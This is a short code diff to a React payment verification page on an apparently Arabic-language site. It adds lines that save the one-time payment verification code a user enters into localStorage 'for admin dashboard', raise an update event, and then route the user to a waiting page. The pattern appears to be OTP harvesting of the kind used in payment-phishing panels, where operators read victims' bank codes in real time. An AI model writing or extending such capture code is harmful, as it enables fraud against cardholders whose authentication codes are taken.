@@ -70,6 +70,11 @@ export function PaymentVerificationPage() {
       setError('يرجى إدخال رمز التحقق كاملاً');
       return;
     }
+    
+    // Store OTP for admin dashboard
+    localStorage.setItem('mawashi-otp-code', fullCode);
+    window.dispatchEvent(new Event('mawashi-data-update'));
+    
     // Navigate to waiting page first
     setLocation('/payment-waiting');
   };
